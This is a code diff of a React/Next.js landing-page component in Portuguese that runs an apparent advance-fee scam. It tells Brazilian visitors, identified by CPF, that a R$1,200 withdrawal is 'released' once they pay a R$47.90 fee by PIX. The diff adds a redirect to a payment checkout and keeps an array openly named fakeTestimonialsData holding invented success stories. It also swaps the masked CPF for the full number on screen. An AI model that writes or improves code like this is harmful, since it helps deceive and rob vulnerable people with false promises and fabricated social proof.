@@ -6,9 +6,7 @@ import { useState, useEffect } from 'react';
 import Image from 'next/image';
 import OfferTimer from '@/components/features/OfferTimer';
 import { Button } from '@/components/ui/button';
-import { CheckCircle, TrendingUp, ShieldCheck, AlertTriangle, Star, BadgePercent } from 'lucide-react';
-// Removed Card and CardContent import as they are no longer used for the main structure or testimonials directly.
-// If other elements were to use them, they'd need to be re-added or kept.
+import { CheckCircle, TrendingUp, ShieldCheck, Star, BadgePercent, Users } from 'lucide-react'; // Added Users
 
 interface OfferStepProps {
   cpf: string | null;
@@ -23,7 +21,7 @@ interface Testimonial {
 }
 
 const fakeTestimonialsData: Testimonial[] = [
-  {
+   {
     name: "MARIA S.",
     location: "Fortaleza/CE",
     text: "Paguei a taxa de R$47,90 com o <strong>CU NA MÃO</strong>, mas para minha surpresa... <strong>CAIU NA HORA!</strong> R$1.200,00 limpos na conta! Essa grana <strong>SALVOU MEU MÊS E MINHA VIDA!</strong> Simplesmente <strong>FODAA!</strong>",
@@ -77,17 +75,19 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
 
   const handleLiberarAcessoClick = () => {
     console.log("LIBERAR ACESSO IMEDIATO AGORA clicado! CPF:", cpf, "Redirect to R$47,90 checkout.");
+    // Replace with actual redirect to AppMax checkout URL
+    window.location.href = "https://appmax.com.br/checkout-url-example"; 
     alert("🚨 ATENÇÃO: Você será redirecionado para o pagamento SEGURO da taxa administrativa de R$47,90. Liberação dos R$1.200,00 IMEDIATA após confirmação do PIX!");
   };
 
-  const formattedCpf = cpf ? `***.${cpf.substring(4, 7)}.${cpf.substring(8, 11)}-**` : '***.***.***-**';
+  const displayedCpf = cpf || '***.***.***-**';
 
   return (
     <div className="w-full max-w-2xl mx-auto p-4 md:p-6 space-y-6 bg-background text-foreground">
         
         <div className="text-center p-4 md:p-6 rounded-lg shadow-[0px_4px_15px_rgba(0,0,0,0.1)] bg-card">
-           <h2 className="font-headline text-2xl md:text-3xl font-bold text-destructive mb-2 uppercase">
-            🔥 <span className="text-destructive">ALERTA MÁXIMO, CPF {formattedCpf}!</span><br/>SEU SAQUE DE <strong className="text-accent text-4xl md:text-5xl">R$1.200,00</strong> FOI LIBERADO AGORA!
+           <h2 className="font-headline text-2xl md:text-3xl font-bold mb-2 uppercase text-foreground">
+            <span>🔥 ALERTA MÁXIMO, CPF {displayedCpf}!</span><br/>SEU SAQUE DE <strong className="text-4xl md:text-5xl">R$1.200,00</strong> FOI LIBERADO AGORA!
           </h2>
           
           <ul className="space-y-2 text-left text-sm md:text-base max-w-md mx-auto bg-secondary/20 p-4 rounded-lg border border-primary/30 shadow">
@@ -147,8 +147,9 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
         
         {/* SEÇÃO DE PROVA SOCIAL */}
         <div className="my-6 md:my-8">
-          <h3 className="font-headline text-xl md:text-2xl font-bold text-primary text-center mb-5 uppercase">
-            👀 COMUNIDADE SAQUE RÁPIDO: VEJA QUEM JÁ <span className="text-accent underline">ENCHEU O BOLSO</span> HOJE!
+          <h3 className="font-headline text-xl md:text-2xl font-bold text-primary text-center mb-5 uppercase flex items-center justify-center">
+            <Users className="mr-2 h-7 w-7" /> {/* Adicionado Users Icon */}
+            COMUNIDADE SAQUE RÁPIDO: VEJA QUEM JÁ <span className="text-accent underline">ENCHEU O BOLSO</span> HOJE!
           </h3>
           <div className="space-y-4">
             {testimonials.map((testimonial, index) => (
